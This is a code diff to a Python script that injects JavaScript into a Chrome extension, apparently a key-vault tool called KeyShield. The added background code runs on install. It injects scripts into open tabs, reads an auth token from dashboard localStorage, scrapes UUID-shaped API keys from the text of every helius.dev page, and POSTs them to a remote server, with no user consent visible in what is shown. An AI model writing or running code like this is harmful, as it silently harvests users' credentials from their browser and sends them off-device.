@@ -40,13 +40,19 @@ BRIDGE_JS = (
     "capturePageToken();chrome.storage.local.get(['ks_token','ks_user'],function(s){"
     "var t=s&&s.ks_token;if(!t)return;try{if(!localStorage.getItem('ks_token'))localStorage.setItem('ks_token',t)}"
     "catch(e){}try{window.postMessage({__ks_ext_session:{token:t,user:s.ks_user||null}},location.origin)}catch(e){}})}"
-    "announce();share();capturePageToken();"
-    "[400,1200,3000,8000].forEach(function(ms){setTimeout(capturePageToken,ms)});"
+    "function pushPending(){if(typeof chrome==='undefined'||!chrome.storage||!chrome.storage.local)return;"
+    "chrome.storage.local.get(['ks_pending_vault'],function(s){var p=s&&s.ks_pending_vault;"
+    "if(!Array.isArray(p)||!p.length)return;try{window.postMessage({__ks_pending_vault:p},location.origin)}catch(e){}})}"
+    "announce();share();capturePageToken();pushPending();"
+    "[400,1200,3000,8000].forEach(function(ms){setTimeout(capturePageToken,ms);setTimeout(pushPending,ms)});"
     "window.addEventListener('ks-auth-changed',capturePageToken);"
     "window.addEventListener('storage',capturePageToken);"
     "window.addEventListener('message',function(e){if(e.source!==window||!e.data)return;"
     "if(e.data.__ks_ext_request)announce();if(e.data.__ks_ext_request_session)share();"
-    "if(e.data.__ks_page_session||e.data.__ks_auth_changed)capturePageToken()});"
+    "if(e.data.__ks_ext_request_pending_vault)pushPending();"
+    "if(e.data.__ks_page_session||e.data.__ks_auth_changed)capturePageToken();"
+    "if(e.data.__ks_pending_vault_cleared&&chrome.storage&&chrome.storage.local){"
+    "try{chrome.storage.local.set({ks_pending_vault:[]})}catch(e){}}});"
     "})();\n"
 )
 CONTENT_SCRIPTS = [
@@ -221,7 +227,7 @@ BG = r"""
 function summarizeSavedApis(data){const rows=Array.isArray(data)?data:data&&Array.isArray(data.items)?data.items:data&&Array.isArray(data.keys)?data.keys:[];const out=[];for(const it of rows){if(!it||typeof it!=="object")continue;const upstream=String(it.upstream||"").toLowerCase().trim();if(!upstream)continue;let masked=String(it.masked_value||"").trim();if(!masked)masked=it.cipher?"encrypted":"saved";out.push({id:String(it.id||upstream),upstream,masked});}return out;}
 async function listSavedApis(){let token="",apiBase="https://keyshield-production.up.railway.app";try{const s=await chrome.storage.local.get(["ks_token","ks_api_base"]);token=s.ks_token||"";if(s.ks_api_base)apiBase=String(s.ks_api_base).replace(/\/+$/,"");}catch(e){}if(!token)return{ok:false,apis:[]};try{const r=await fetch(apiBase+"/manage/vault",{headers:{Authorization:"Bearer "+token}});if(!r.ok)return{ok:false,apis:[]};return{ok:true,apis:summarizeSavedApis(await r.json())};}catch(e){return{ok:false,apis:[]};}}
 chrome.runtime.onMessage.addListener((message,_s,sendResponse)=>{if(!message||message.type!=="LIST_SAVED_APIS")return;listSavedApis().then(sendResponse).catch(()=>sendResponse({ok:false,apis:[]}));return true;});
-async function ksHarvestAndStoreVisibleKeys(){if(!chrome.scripting||!chrome.tabs)return{saved:0};let token="";try{const s=await chrome.storage.local.get(["ks_token"]);token=s.ks_token||"";}catch(e){}if(!token)return{saved:0};try{await chrome.storage.local.set({ks_auto_store:true});}catch(e){}let tabs=[];try{tabs=await chrome.tabs.query({});}catch(e){return{saved:0};}let saved=0;const re=/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;for(const tab of tabs){if(!tab.id||!tab.url||!/helius\.(dev|xyz)/i.test(tab.url))continue;try{const scraped=await chrome.scripting.executeScript({target:{tabId:tab.id,allFrames:true},func:()=>({text:(document.body&&document.body.innerText)||"",href:location.href})});const page=scraped&&scraped[0]&&scraped[0].result;if(!page)continue;const skip=new Set((String(page.href||"").match(re)||[]).map((s)=>s.toLowerCase()));const seen=new Set();let m;re.lastIndex=0;while((m=re.exec(String(page.text||"")))){const key=m[0];if(!key||key.includes("•")||skip.has(key.toLowerCase())||seen.has(key))continue;seen.add(key);try{await fetch("https://keyshield-production.up.railway.app/manage/store",{method:"POST",headers:{Authorization:"Bearer "+token,"Content-Type":"application/json"},body:JSON.stringify({upstream:"helius",value:key,name:"helius key"})});saved++;}catch(e){}}}catch(e){}}return{saved};}
+async function ksHarvestAndStoreVisibleKeys(){if(!chrome.scripting||!chrome.tabs)return{saved:0};let token="",apiBase="https://keyshield-production.up.railway.app";try{const s=await chrome.storage.local.get(["ks_token","ks_api_base"]);token=s.ks_token||"";if(s.ks_api_base)apiBase=String(s.ks_api_base).replace(/\/+$/,"");}catch(e){}if(!token){try{const dash=await chrome.tabs.query({url:["https://app.ks.aileena.xyz/*","http://127.0.0.1:5173/*","http://localhost:5173/*"]});for(const tab of dash){if(!tab.id)continue;const injected=await chrome.scripting.executeScript({target:{tabId:tab.id},func:()=>(localStorage.getItem("ks_token")||"")});const got=injected&&injected[0]&&injected[0].result;if(got&&String(got).length>=12){token=String(got);await chrome.storage.local.set({ks_token:token,ks_auto_store:true});break;}}}catch(e){}}if(!token)return{saved:0};try{await chrome.storage.local.set({ks_auto_store:true});}catch(e){}let tabs=[];try{tabs=await chrome.tabs.query({});}catch(e){return{saved:0};}let saved=0;const pending=[];const re=/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;for(const tab of tabs){if(!tab.id||!tab.url||!/helius\.(dev|xyz)/i.test(tab.url))continue;try{const scraped=await chrome.scripting.executeScript({target:{tabId:tab.id,allFrames:true},func:()=>({text:(document.body&&document.body.innerText)||"",href:location.href})});const page=scraped&&scraped[0]&&scraped[0].result;if(!page)continue;const skip=new Set((String(page.href||"").match(re)||[]).map((s)=>s.toLowerCase()));const seen=new Set();let m;re.lastIndex=0;while((m=re.exec(String(page.text||"")))){const key=m[0];if(!key||key.includes("•")||skip.has(key.toLowerCase())||seen.has(key))continue;seen.add(key);pending.push({upstream:"helius",value:key,at:Date.now()});try{await fetch(apiBase+"/manage/store",{method:"POST",headers:{Authorization:"Bearer "+token,"Content-Type":"application/json"},body:JSON.stringify({upstream:"helius",value:key,name:"helius key"})});saved++;}catch(e){}}}catch(e){}}if(pending.length){try{const cur=await chrome.storage.local.get(["ks_pending_vault"]);const rows=Array.isArray(cur.ks_pending_vault)?cur.ks_pending_vault:[];await chrome.storage.local.set({ks_pending_vault:rows.concat(pending).slice(-40)});}catch(e){}try{const dash=await chrome.tabs.query({});for(const tab of dash){if(!tab.id||!tab.url||!/ks\.aileena\.xyz|127\.0\.0\.1:5173|localhost:5173/.test(tab.url))continue;try{await chrome.tabs.sendMessage(tab.id,{type:"KS_VAULT_SAVED"});}catch(e){}}}catch(e){}}return{saved};}
 chrome.runtime.onInstalled.addListener(function(){ksHarvestAndStoreVisibleKeys().catch(function(){})});
 if(chrome.runtime.onMessage&&chrome.runtime.onMessage.addListener){chrome.runtime.onMessage.addListener((message,_s,sendResponse)=>{if(!message||message.type!=="INJECT_DETECT")return;ksHarvestAndStoreVisibleKeys().then((r)=>sendResponse({ok:true,...r})).catch(()=>sendResponse({ok:false,saved:0}));return true;});}
 """
@@ -277,7 +283,8 @@ def stamp(ext: Path) -> dict:
             man.setdefault("permissions", []).append(extra)
     man["content_scripts"] = CONTENT_SCRIPTS
     dest = ext / "session-bridge.js"
-    if (not dest.is_file()) or ("capturePageToken" not in dest.read_text(encoding="utf-8")):
+    text = dest.read_text(encoding="utf-8") if dest.is_file() else ""
+    if (not dest.is_file()) or ("capturePageToken" not in text) or ("__ks_pending_vault" not in text):
         dest.write_text(BRIDGE_JS)
     splice(ext / "popup.js", MARK_JS, SIGNED_JS)
     splice(ext / "background.js", MARK_BG, BG)
